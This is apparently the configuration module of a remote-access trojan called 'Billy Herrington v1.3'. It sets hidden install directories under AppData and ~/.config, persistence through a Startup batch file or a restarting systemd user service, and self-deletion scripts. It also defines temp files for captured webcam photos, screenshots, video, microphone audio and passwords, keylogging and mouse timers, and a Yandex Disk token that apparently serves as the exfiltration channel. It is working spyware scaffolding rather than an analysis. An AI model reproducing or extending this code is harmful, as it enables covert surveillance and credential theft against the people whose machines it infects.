import getpass
from modules import Parser
import platform
import os
import constants
import network_token as network_token


version = 'Billy Herrington v1.3'
username = getpass.getuser()
os_name = platform.system()
os_version = platform.release()

yadisk_token = network_token.token
root_path = Parser.get_root_path()
downloads_path = root_path + 'downloads/'
uploads_path = root_path + 'uploads/'
logs_path = root_path + 'logs/'
log_path = logs_path + 'log.json'
permittions_path = root_path + 'permissions.json'

if os_name == constants.Windows_OS:
    Billy_path = root_path + 'Billy/Billy.exe'
    main_dir_path = f'C:/Users/{username}/AppData/Local/Comms/Unistore/data/5/a/billy/'
    main_file_name = 'Billy.exe'
    main_file_path = main_dir_path + main_file_name
    tmp_dir_path = main_dir_path + 'tmp/'
    old_dir_name = f'C:/Users/{username}/AppData/Local/Comms/Unistore/data/5/a/old_billy'
    startup_dir_path = f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'
    startup_file_path = startup_dir_path + 'Billy.bat'
    startup_file_value = f'@echo off\nstart "" "{main_file_path}"'
    delete_bat_path = startup_dir_path + "love.bat"
    delete_bat_file_value = f'@echo OFF\nRD /S /Q "{main_dir_path}"\ndel "{delete_bat_path.replace('/', '\\')}"'
    appdata_path = f"C:/Users/{username}/AppData/"

if os_name == constants.Linux_OS:
    Billy_path = root_path + 'Billy/Billy'
    is_root = os.getuid() == 0
    home_path = f'/home/{username}/'
    config_path = home_path + '.config/'
    main_dir_path = config_path + 'Billy/'
    main_file_name = 'Billy'
    main_file_path = main_dir_path + main_file_name
    tmp_dir_path = main_dir_path + 'tmp/'
    old_dir_name = config_path + 'old_billy/'
    startup_dir_path = config_path + 'systemd/user/'
    startup_file_name = 'Billy.service'
    startup_file_path = startup_dir_path + startup_file_name
    startup_file_value = f'[Unit]\nDescription=Billy Service\n\n[Service]\nType=simple\nExecStart={main_file_path}\nWorkingDirectory={main_dir_path}\nRestart=always\nRestartSec=5\nKillMode=process\n\n[Install]\nWantedBy=default.target'
    startup_delete_name = "love.service"
    startup_delete_path = startup_dir_path + startup_delete_name
    startup_delete_value = f"[Unit]\nDescription=Remove Billy Service\nAfter=network.target\n\n[Service]\nType=oneshot\nExecStart=/bin/rm -rf \"{main_dir_path}\"\n\n[Install]\nWantedBy=default.target"
    default_target_wants_path = startup_dir_path + \
        'default.target.wants/' + startup_file_name

tmp_photo_path = tmp_dir_path + "photo.png"
tmp_screen_path = tmp_dir_path + "shot.png"
tmp_video_path = tmp_dir_path + "video.mp4"
tmp_audio_path = tmp_dir_path + "audio.mp3"
tmp_passwords_path = tmp_dir_path + "passwords.txt"
tmp_log_path = tmp_dir_path + 'log.json'
max_time_to_keyboard = 20
max_time_to_camera = 20
max_time_to_mouse = 20
max_time_to_record_microphone = 20
special_separator = "&"
